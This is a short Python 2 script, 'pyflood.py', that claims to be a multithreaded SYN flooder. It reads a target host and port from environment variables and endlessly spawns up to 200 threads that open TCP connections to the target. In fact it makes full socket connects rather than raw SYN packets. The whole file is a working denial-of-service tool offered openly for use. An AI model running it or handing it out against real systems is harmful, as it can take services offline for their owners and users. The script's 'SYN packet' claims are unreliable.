#!/usr/bin/env python

# pyflood.py
# Modified by Evan Gray, original author below.
# New name, same great taste.

#########################################
#
# SYNflood.py - A multithreaded SYN Flooder
# By Brandon Smith
# brandon.smith@studiobebop.net
#
# This script is a demonstration of a SYN/ACK 3 Way Handshake Attack
# as discussed by Halla of Information Leak
#
#########################################

import socket
import random
import sys
import threading
import os

interface    = None
target       = None
port         = None
thread_limit = 200
total        = 0

conf = (os.getenv('INTERFACE', 'eth0'), os.getenv('TARGET', '127.0.0.1'),
  os.getenv('PORT', 80))

class sendSYN(threading.Thread):
  global target, port
  def __init__(self):
    threading.Thread.__init__(self)

  def run(self):
    s = socket.socket()
    s.connect((target,port))

if __name__ == "__main__":

  interface        = conf[0]
  target           = conf[1]
  port             = int(conf[2])
  print conf

  # Hop to it!
  print "Flooding %s:%i with SYN packets." % (target, port)
  while True:
    if threading.activeCount() < thread_limit:
      sendSYN().start()
      total += 1
      sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
